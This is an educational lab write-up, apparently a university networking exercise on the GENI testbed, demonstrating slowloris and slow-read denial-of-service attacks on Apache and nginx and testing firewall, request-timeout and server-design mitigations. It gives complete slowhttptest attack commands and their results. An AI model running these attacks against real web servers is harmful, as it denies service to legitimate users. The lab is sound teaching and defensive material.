This experiment explores slowloris, a denial of service attack that requires very little bandwidth and causes vulnerable web servers to stop accepting connections to other users. This experiment highlights the difficulty associated with mitigating a denial of service attack, without affecting legitimate users.

This experiment should take about 60 minutes to run.

This experiment involves running a potentially disruptive application over a private network, in a way that does not affect infrastructure outside of your slice. Take special care not to use this application in ways that may adversely affect other infrastructure. Users of GENI are responsible for ensuring compliance with the [GENI Resource Recommended User Policy](http://groups.geni.net/geni/raw-attachment/wiki/RUP/RUP.pdf).


To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes).


* Skip to [Results](#results)
* Skip to [Run my experiment](#runmyexperiment)


## Background

Denial-of-service (DoS) attacks aim to block access by "legitimate" users of a website or other Internet service, typically by exhausting the resources of the service (e.g. bandwidth, CPU, memory) or causing it to crash.

Slowloris is a type of denial of service attack that operates at Layer 7 (the application layer), and does not require many resources on the part of the attacker. It exploits a design approach of many web servers, allowing a single machine to take down another machine's vulnerable web server with minimal bandwidth.

It achieves this by opening as many connections to the target web server as it can, and holding them open as long as possible by sending a partial request, and adding to it periodically (to keep the connection alive) but never completing it. Affected servers use threads to handle each concurrent connection, and have a limit on the total number of threads. Under slowloris attack, the pool of threads is consumed by the attacker and the service will deny connection attempts from legitimate users.

Slowloris was famously used in 2009 against Iranian government servers during protests related to the elections that year.


## Results

The following image shows the response of an Apache web server to a slowloris attack. We see that when there are a large number of established connections, the service becomes unavailable (green line goes to zero.)

![](/blog/content/images/2016/03/apache-no-mitigation.svg)

When we limit the rate of traffic from the attacker to 100 kbps, the attack is still successful:

![](/blog/content/images/2016/03/apache_lowrate_client.svg)

Using a firewall to limit the number of connections from a single host is more successful. While slowhttptest still reports that the service is unavailable, in fact, it is only unavailable to the malicious attacker (which we can see is limited to 20 connections):

![](/blog/content/images/2016/03/apache_iptables.svg)

but other hosts *are* able to access the service. However, this mitigation has some limitations, and some undesirable side effects.

Alternatively, we can try an application-layer defense that closes connections if the client does not send the HTTP request in a timely manner. This partially mitigates slowloris:

![](/blog/content/images/2021/04/slowloris-reqtimeout.svg)

However, if the attacker changes their approach - for example, to use a "slow read" of the response instead of slowly sending the request - then this attack is not effective:

![](/blog/content/images/2021/04/apache_slowread.svg)

Finally, we found that the nginx web server is resistant to slowloris (even without a firewall limiting the number of connections per host, or application-layer mitigation that closes slow connections) because of its non-blocking approach, which supports a higher level of concurrency:

![](/blog/content/images/2021/04/nginx_nomitigation.svg)

## Run my experiment

In the GENI Portal, create a new slice, and load the [RSpec](https://gist.github.com/ffund/b9b69d4a118d009761a7aca664f0324a) from the following URL: [https://git.io/JOcno](https://git.io/JOcno)

This will load a topology with three nodes connected by a link, like this:

![](/blog/content/images/2020/03/slowloris-1.png)

Click on "Site 1" and choose an InstaGENI aggregate, then reserve these resources.


### Install software

When your nodes are ready to log in, SSH into the server node and run 

```
sudo apt-get update
sudo apt-get -y install lynx apache2
```

to install the Apache web server (and Lynx, a text-based web browser for use in terminal sessions). 

Recent versions of Apache come with some slowloris mitigation enabled by default. We will start with this mitigation disabled, so run

```
sudo a2dismod reqtimeout
sudo systemctl restart apache2
```

to turn it off.

In a second terminal, SSH into the attacker node and run

```
sudo apt-get update
sudo apt-get -y install slowhttptest
```

to install the [slowhttptest](https://github.com/shekyan/slowhttptest/wiki) tool. This tool implements several Layer 7 DoS attacks, including slowloris.

On a third terminal, SSH into the client node, and run

```
sudo apt update
sudo apt-get -y install lynx
```


### Capture a legitimate user's HTTP exchange

First, we'll look at an HTTP exchange by a "legitimate" user. On the server node, run

```
sudo tcpdump -i eth1 -w apache_legitimate.pcap
```

Then, run

```
lynx http://server
```

on the client node and you should see the Apache2 Ubuntu Default Page.

Stop the `tcpdump` with Ctrl+C, and transfer it to your laptop for analysis. In Wireshark set View > Time Display Format to "Seconds Since Beginning of Capture". How long does it take the client to send the entire HTTP request? How long does the entire TCP connection last?

### Slowloris attack


Next, we'll capture a slowloris attack with no mitigation. On the server node, run

```
sudo tcpdump -i eth1 -w apache_no_mitigation.pcap
```


Then, on the attacker, run

```
slowhttptest -c 1000 -H -g -o apache_no_mitigation -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
```

In the terminal output, you will see the test parameters, e.g.

```
test type:                        SLOW HEADERS
number of connections:            1000
URL:                              http://server/
verb:                             GET
Content-Length header value:      4096
follow up data max size:          52
interval between follow up data:  10 seconds
connections per seconds:          200
probe connection timeout:         3 seconds
test duration:                    120 seconds
using proxy:                      no proxy 
```

and you'll also see the current connections and their states, as well as the availability of the server. The message

```
service available:   NO
```

means that the DoS attack on the web server was successful.

This test will run for 120 seconds. After about half a minute, while the test is still running, try to access the web page again on the client node by running

```
lynx http://server
```

and verify that it is not responsive:

![](/blog/content/images/2017/04/slowloris-no.png)

Also, if you run

```
ss -nt state ESTABLISHED 'sport = :80'
```


on the server, you will see many TCP connections to port 80 in the ESTABLISHED state, a hallmark of this kind of attack.

After the test finishes running, transfer the "apache\_no\_mitigation.html" to your laptop with scp. Open this file with a web browser. You should see an image similar to the first one in the [Results](#results) section, indicating that the large number of established connections has made the service unavailable:

![](/blog/content/images/2016/03/apache-no-mitigation.svg)

Use Ctrl+C to stop the `tcpdump`, and transfer the packet capture to your laptop with `scp`. Open the packet capture in Wireshark, and find a TCP exchange where the attacker establishes a connection, and sends the requests very slowly. Select one packet in this connection, then right-click on it and choose Conversation Filter > TCP, to filter your packet capture on this single TCP exchange. 

In slowloris, the attacker does not terminate the HTTP request header in a single packet. Use the Analyze > Follow > TCP Stream tool in Wireshark to see all of the TCP data in this exchange. Click on each line in the HTTP request header, one at a time, and the corresponding packet will be highlighted in the Wireshark packet list.  Note the time at which each header line is sent.

Then, clear the conversation filter from the filter bar.

A few seconds into the attack, you will observe in the packet capture that when the attacker sends a TCP SYN, there is no corresponding SYN-ACK from the server, and the attacker keeps retransmitting the same SYN until it eventually gives up.  Right-click on one of these packets and choose Conversation Filter > TCP, to filter your packet capture on this single TCP exchange. Explain this observation in your own words. Why is the TCP SYN retransmitted many times? What does this indicate?

#### Attacker with limited bandwidth

Next, let's confirm that this attack is still feasible when the attacker has very limited bandwidth. On the attacker node, run
<pre>
sudo tc qdisc replace dev eth1 root netem rate 100kbit
</pre>

This will limit the rate of outgoing traffic on this interface to 100 kbps.

Now we'll run the slowloris attack again. On the attacker, run (all on a single line)

<pre>
slowhttptest -c 1000 -H -g -o apache_lowrate_client -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
</pre>

Wait about 30 seconds and then check the service availability by running lynx again on the client. When the test finishes (after 120 seconds), transfer the "apache\_lowrate\_client.html" file to your laptop with SCP and open it in a browser. Open this file with a web browser. You should see an image similar to the second one in the [Results](#results) section, indicating that even when the attacker has very little available bandwidth, the attack can still be successful:

![](/blog/content/images/2016/03/apache_lowrate_client.svg)


Remove the rate limiting traffic shaper on the attacker with

<pre>
sudo tc qdisc delete dev eth1 root
</pre>

#### Firewall limiting connections per address

Next we will try using firewall rules to mitigate this attack. Specifically, we will create a rule that says that any single host is limited to 20 connections to port 80 on the server. 

On the server, run

<pre>
sudo iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
</pre>

to set up this rule.

Then, also on the server, run

```
sudo tcpdump -i eth1 -w apache_iptables.pcap
```

and on the attacker, run

<pre>
slowhttptest -c 1000 -H -g -o apache_iptables -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
</pre>


and then, after half a minute, run 

```
lynx http://server
```

on the client to check the availability of the service. Even when slowhttptest reports

```
service available:   NO
```

we can still load the page in lynx on the client:

![](/blog/content/images/2017/04/slowloris-ok.png)

This is because the service is only unavailable to the malicious user. The firewall does not affect a non-malicious user with fewer connections.

Transfer the file "apache\_iptables.html" to your laptop with SCP and open it in a browser. Compare it to the third figure in the [Results](#results) section. Although the service appears to be unavailable, it is only unavailable from the attacker's point of view; other hosts can still connect.

![](/blog/content/images/2016/03/apache_iptables.svg)


While this mitigation prevents a slowloris attack that is launched from only one host, it still would not protect against a distributed slowloris attack, with many participants each consuming a smaller number of connections. Also, if the number of allowed connections per host is set too low, it might limit connections from clients behind a NAT or a proxy, which share the same IP address.

Use Ctrl+C to stop the `tcpdump` and transfer the file to your laptop. Open this file in Wireshark to observe the effect of the firewall.

Finally, use

```
sudo iptables --flush
```

to remove the firewall rule on the server. 


#### Request timeout


Recent Apache packages have a module called "Request Timeout" installed by default. This module can mitigate slowloris to some extent:

Enable the module by running the following command on the server:

```
sudo a2enmod reqtimeout
sudo systemctl restart apache2
```

You can see the default module configuration with

```
cat /etc/apache2/mods-enabled/reqtimeout.conf
```

The default configuration gives the client a maximum of 20 seconds before it must start sending the headers of the HTTP request. Also, the client must then send data with a minimum rate of 500 bytes per second, and send the header within 40 seconds.

With the request timeout module in place, try running the same attack. On the server, run


```
sudo tcpdump -i eth1 -w apache_reqtimeout.pcap
```

and on the attacker, run

<pre>
slowhttptest -c 1000 -H -g -o apache_reqtimeout -i 10 -r 200 -t GET -u http://server -x 24 -p 3 -l 120
</pre>


and then, after half a minute, run 

```
lynx http://server
```

on the client to check the availability of the service.  Try to access the service several times while the attack is ongoing. With the request timeout module, the attack is partly mitigated; there may be instances when the client is denied service, but it should be able to connect successfully some of the time.

Transfer the file "apache\_reqtimeout.html" to your laptop with SCP and open it in a browser. Compare it to the fourth figure in the [Results](#results) section:

![](/blog/content/images/2021/04/slowloris-reqtimeout.svg)

Also use Ctrl+C to stop the `tcpdump`, and use `scp` to transfer the packet capture to your laptop. Use this file to observe the effect of the request timeout module.

While this mitigation is somewhat effective, an attacker can bypass it to some extent by modifying the parameters of the slowloris attack. For example, the attacker can send the first byte of the request header in just under 20 seconds, then send additional bytes of the request header at a rate of just above 500 Bps to keep each connection open for up to 40 seconds.

Alternatively, an attacker can bypass this mitigation by changing the attack approach: instead of sending the request very slowly, the attacker can read the response very slowly, forcing the connection to stay open. This is know as the "slow read" attack. 

On the server, run


```
sudo tcpdump -i eth1 -w apache_slowread.pcap
```

and on the attacker, run

<pre>
slowhttptest -c 1000 -X -g -o apache_slowread -i 10 -r 200 -w 1 -y 100 -k 10 -t GET -u http://server/ -l 120
</pre>

to try this attack. Then, after half a minute, run 

```
lynx http://server
```

on the client to check the availability of the service.  

Transfer the file "apache\_slowread.html" to your laptop with SCP and open it in a browser. Compare it to the fifth figure in the [Results](#results) section:

![](/blog/content/images/2021/04/apache_slowread.svg)

Also use Ctrl+C to stop the `tcpdump`, and use `scp` to transfer the packet capture to your laptop. Use this file to observe the slow read attack.


#### Alternative application design

We are going to try one more way to mitigate this attack: changing the application design. 

The Apache web server allocates a worker thread for each connection, allowing a slow or idle connection to block an entire thread. When the total number of worker threads is exhausted, then no new connection are accepted.

In contrast, the nginx web server has a non-blocking design, in which worker threads are not assigned to connections on a one-to-one basis. Instead, a thread will dynamically serve a connection only when there is data to send or receive for that connection. This makes it more resistant to the slowloris attack at Layer 7 (although it may still be possible to launch a low-rate attack that exhausts the total number of connections possible at a lower level, such as the total number of file descriptors available to the operating system.)

On the server node, stop the Apache server with

```
sudo systemctl stop apache2
```

Then install nginx:

```
sudo apt-get update
sudo apt-get -y install nginx
```


Even though its design is very different, with its default settings, nginx may still be affected by slowloris, because there is a configuration value that limits the number of connections a nginx thread can handle. To increase this number from the default (768 connections) to a large number (100k connections), run

<pre>
sudo sed -i 's/worker_connections 768/worker_connections 100000/g' /etc/nginx/nginx.conf
</pre>


Then, run

```
sudo systemctl restart nginx
```

to restart nginx on the server.

Run the attack from the attacker again, with

<pre>
slowhttptest -c 1000 -H -g -o nginx_no_mitigation -i 10 -r 200 -t GET -u http://server/index.nginx-debian.html -x 24 -p 3 -l 120  
</pre>

and after 30 seconds, run

```
lynx http://server/index.nginx-debian.html
```

on the client. Here, you should see a "Welcome to nginx" page:

![](/blog/content/images/2017/04/slowloris-nginx.png)

When the attack finishes, transfer the "nginx\_no\_mitigation.html" file to your laptop with SCP and open it in a browser. You should find that the service generally remains available (even from the point of view of the malicious attacker) despite a large number of established connections (as in the sixth figure in the [Results](#results) section.) Due to the different in application design, this web server is less vulnerable to the slowloris attack.

![](/blog/content/images/2021/04/nginx_nomitigation.svg)


When you are finished, please delete your resources in the GENI Portal, to free them up for other experimenters!
